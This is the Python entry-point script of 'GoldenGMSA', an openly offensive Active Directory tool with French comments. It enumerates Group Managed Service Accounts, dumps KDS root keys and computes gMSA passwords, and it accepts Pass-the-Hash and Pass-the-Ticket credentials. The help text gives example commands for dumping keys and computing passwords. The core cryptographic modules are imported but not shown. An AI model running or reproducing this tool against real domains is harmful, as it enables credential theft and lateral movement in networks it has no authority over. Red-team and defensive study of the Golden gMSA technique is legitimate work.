#!/usr/bin/env python3
"""
GoldenGMSA - Équivalence Python
Outil pour exploiter les Group Managed Service Accounts (gMSA) dans Active Directory.
Basé sur la recherche de Yuval Gordon (@YuG0rd).

Usage:
    python main.py gmsainfo [options]
    python main.py kdsinfo [options]  
    python main.py compute [options]

Pour plus de détails, consultez le README.md
"""

import argparse
import sys
import traceback
from typing import Optional, List
import logging

from golden_gmsa.gmsa_account import GmsaAccount
from golden_gmsa.root_key import RootKey
from golden_gmsa.gmsa_password import GmsaPassword
from golden_gmsa.msds_managed_password_id import MsdsManagedPasswordId
from golden_gmsa.ldap_utils import LdapUtils, LdapConnection


def setup_logging():
    """Configure le logging pour l'application."""
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )


def process_gmsa_info(args):
    """Traite la commande gmsainfo."""
    print()
    try:
        domain_name = args.domain.lower() if args.domain else LdapUtils.get_current_domain()
        if domain_name:
            domain_name = domain_name.lower()
        
        if args.sid:
            gmsa = GmsaAccount.get_gmsa_account_by_sid(domain_name, args.sid)
            if gmsa:
                print(gmsa.to_string())
            else:
                print(f"GMSA avec SID {args.sid} non trouvé dans le domaine {domain_name}")
        else:
            gmsa_accounts = GmsaAccount.find_all_gmsa_accounts_in_domain(domain_name)
            for gmsa in gmsa_accounts:
                print(gmsa.to_string())
                
    except Exception as ex:
        print(f"ERREUR: {ex}")
        if args.verbose:
            traceback.print_exc()


def process_kds_info(args):
    """Traite la commande kdsinfo."""
    print()
    try:
        forest_name = args.forest.lower() if args.forest else LdapUtils.get_current_forest()
        if forest_name:
            forest_name = forest_name.lower()
        
        if args.guid:
            root_key = RootKey.get_root_key_by_guid(forest_name, args.guid)
            if root_key is None:
                print(f"Clé racine KDS avec ID {args.guid} non trouvée")
            else:
                print(root_key.to_string())
        else:
            root_keys = RootKey.get_all_root_keys(forest_name)
            for root_key in root_keys:
                print(root_key.to_string())
                
    except Exception as ex:
        print(f"ERREUR: {ex}")
        if args.verbose:
            traceback.print_exc()


def process_compute(args):
    """Traite la commande compute."""
    print()
    try:
        if not args.sid:
            raise ValueError("L'argument --sid est requis")
            
        domain_name = ""
        forest_name = ""
        
        # Mode en ligne (nécessite un accès privilégié)
        if not args.kdskey or not args.pwdid:
            if not args.forest:
                forest_name = LdapUtils.get_current_forest()
            else:
                forest_name = args.forest
            if forest_name:
                forest_name = forest_name.lower()
                
            if not args.domain:
                domain_name = LdapUtils.get_current_domain()
            else:
                domain_name = args.domain
            if domain_name:
                domain_name = domain_name.lower()
        
        pwd_id = None
        root_key = None
        
        if not args.pwdid:
            pwd_id = MsdsManagedPasswordId.get_managed_password_id_by_sid(domain_name, args.sid)
        else:
            import base64
            pwd_id_bytes = base64.b64decode(args.pwdid)
            pwd_id = MsdsManagedPasswordId(pwd_id_bytes)
        
        if pwd_id is None:
            print(f"Échec de localisation de l'identifiant de mot de passe géré pour le SID {args.sid}")
            return
        
        if not args.kdskey:
            root_key = RootKey.get_root_key_by_guid(forest_name, pwd_id.root_key_identifier)
        else:
            import base64
            root_key_bytes = base64.b64decode(args.kdskey)
            root_key = RootKey(root_key_bytes=root_key_bytes)
        
        if root_key is None:
            print(f"Échec de localisation de la clé racine KDS avec ID {pwd_id.root_key_identifier}")
            return
        
        pwd_bytes = GmsaPassword.get_password(
            args.sid, root_key, pwd_id, domain_name, forest_name
        )
        
        import base64
        print(f"Mot de passe encodé en Base64:\t{base64.b64encode(pwd_bytes).decode('utf-8')}")
        
    except Exception as ex:
        print(f"ERREUR: {ex}")
        if args.verbose:
            traceback.print_exc()


def main():
    """Point d'entrée principal de l'application."""
    setup_logging()
    
    parser = argparse.ArgumentParser(
        description="GoldenGMSA - Outil pour exploiter les Group Managed Service Accounts",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemples d'utilisation:

# Énumérer tous les gMSA
python main.py gmsainfo

# Interroger un gMSA spécifique
python main.py gmsainfo --sid S-1-5-21-2183999363-403723741-3725858571

# Dumper toutes les clés racine KDS
python main.py kdsinfo

# Dumper une clé racine KDS spécifique
python main.py kdsinfo --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb

# Calculer le mot de passe d'un gMSA (mode lazy)
python main.py compute --sid S-1-5-21-2183999363-403723741-3725858571

# Calculer le mot de passe d'un gMSA (mode hors ligne)
python main.py compute --sid S-1-5-21-2183999363-403723741-3725858571 \\
    --kdskey AQAAALm45UZXyuYB6Ln7smfkresAAAA... \\
    --pwdid AQAAAEtEU0sCAAAAaAEAABAAAAADAAAA...
        """
    )
    
    parser.add_argument('--verbose', '-v', action='store_true',
                       help='Activer les messages de débogage détaillés')
    
    # Arguments d'authentification globaux
    auth_group = parser.add_argument_group('Authentication')
    auth_group.add_argument('-u', '--username', type=str,
                           help='Username (format: user@domain.com or DOMAIN\\user)')
    auth_group.add_argument('-p', '--password', type=str,
                           help='Password')
    auth_group.add_argument('-d', '--domain', type=str,
                           help='Domain/DC to query')
    auth_group.add_argument('-f', '--forest', type=str,
                           help='Forest to query')
    auth_group.add_argument('--dc-ip', type=str,
                           help='Domain controller IP address')
    auth_group.add_argument('--use-ssl', action='store_true',
                           help='Use LDAPS (port 636)')
    
    # Advanced authentication (PTH/PTT)
    advanced_auth_group = parser.add_argument_group('Advanced Authentication (PTH/PTT)')
    advanced_auth_group.add_argument('--nt-hash', '--nthash', type=str,
                                    help='NTLM hash for Pass-the-Hash (format: 32 hex chars)')
    advanced_auth_group.add_argument('--lm-hash', '--lmhash', type=str,
                                    help='LM hash for Pass-the-Hash (optional, default: empty)')
    advanced_auth_group.add_argument('--aes-key', '--aeskey', type=str,
                                    help='AES key for Kerberos authentication')
    advanced_auth_group.add_argument('--ccache', type=str,
                                    help='Kerberos ccache file for Pass-the-Ticket')
    advanced_auth_group.add_argument('--use-kerberos', '--kerberos', action='store_true',
                                    help='Force Kerberos authentication')
    
    subparsers = parser.add_subparsers(dest='command', help='Commandes disponibles')
    
    # Commande gmsainfo (insensible à la casse via normalisation)
    gmsa_parser = subparsers.add_parser('gmsainfo', 
                                       help='Interroger les informations gMSA')
    gmsa_parser.add_argument('-s', '--sid', type=str,
                            help='Le SID du gMSA à interroger')
    
    # Commande kdsinfo (insensible à la casse via normalisation)
    kds_parser = subparsers.add_parser('kdsinfo',
                                      help='Interroger les informations des clés racine KDS')
    kds_parser.add_argument('-g', '--guid', type=str,
                           help='Le GUID de l\'objet clé racine KDS')
    
    # Commande compute (insensible à la casse via normalisation)
    compute_parser = subparsers.add_parser('compute',
                                          help='Calculer les mots de passe gMSA')
    compute_parser.add_argument('-s', '--sid', type=str, required=True,
                               help='Le SID du gMSA')
    compute_parser.add_argument('-k', '--kdskey', type=str,
                               help='Clé racine KDS encodée en Base64')
    compute_parser.add_argument('--pwdid', type=str,
                               help='Base64 de la valeur de l\'attribut msds-ManagedPasswordID')
    
    # Parse arguments avec normalisation de la casse pour les commandes
    raw_args = sys.argv[1:]
    
    # Normaliser la commande (premier argument) en minuscules si c'est une commande valide
    valid_commands = ['gmsainfo', 'kdsinfo', 'compute']
    if raw_args and raw_args[0].lower() in [cmd.lower() for cmd in valid_commands]:
        raw_args[0] = raw_args[0].lower()
    
    args = parser.parse_args(raw_args if raw_args else sys.argv[1:])
    
    # Normaliser la commande en minuscules (insensible à la casse)
    if args.command:
        args.command = args.command.lower()
    
    if not args.command:
        parser.print_help()
        return
    
    try:
        ldap_conn = None
        
        # Normaliser domain et forest en minuscules (insensible à la casse)
        if args.domain:
            args.domain = args.domain.lower()
        if args.forest:
            args.forest = args.forest.lower()
        
        # Check if any authentication method is provided
        has_auth = (
            args.password or 
            getattr(args, 'nt_hash', None) or 
            getattr(args, 'ccache', None) or 
            getattr(args, 'aes_key', None) or
            getattr(args, 'use_kerberos', False)
        )
        
        if args.username and has_auth:
            domain = args.domain or args.forest
            if not domain:
                print("ERROR: --domain or --forest required with --username")
                sys.exit(1)
                
            # Determine authentication method
            auth_method = "password"
            if hasattr(args, 'nt_hash') and args.nt_hash:
                auth_method = "Pass-the-Hash"
            elif hasattr(args, 'ccache') and args.ccache:
                auth_method = "Pass-the-Ticket"
            elif hasattr(args, 'aes_key') and args.aes_key:
                auth_method = "Kerberos (AES)"
            elif hasattr(args, 'use_kerberos') and args.use_kerberos:
                auth_method = "Kerberos"
            
            print(f"Authenticating to domain {domain} ({auth_method})...")
            ldap_conn = LdapConnection(
                domain=domain,
                username=args.username,
                password=args.password,
                use_ssl=args.use_ssl,
                dc_ip=args.dc_ip,
                nt_hash=getattr(args, 'nt_hash', None),
                lm_hash=getattr(args, 'lm_hash', None),
                aes_key=getattr(args, 'aes_key', None),
                ccache=getattr(args, 'ccache', None),
                use_kerberos=getattr(args, 'use_kerberos', False)
            )
            ldap_conn.connect()
            LdapUtils.set_connection(ldap_conn)
            print(f"Connected to domain {domain}\n")
        
        if args.command == 'gmsainfo':
            process_gmsa_info(args)
        elif args.command == 'kdsinfo':
            process_kds_info(args)
        elif args.command == 'compute':
            process_compute(args)
        else:
            print(f"Commande inconnue: {args.command}")
            parser.print_help()
            
        if ldap_conn:
            ldap_conn.disconnect()
            
    except KeyboardInterrupt:
        print("\nInterruption par l'utilisateur")
        sys.exit(1)
    except Exception as ex:
        print(f"Erreur fatale: {ex}")
        if args.verbose:
            traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()
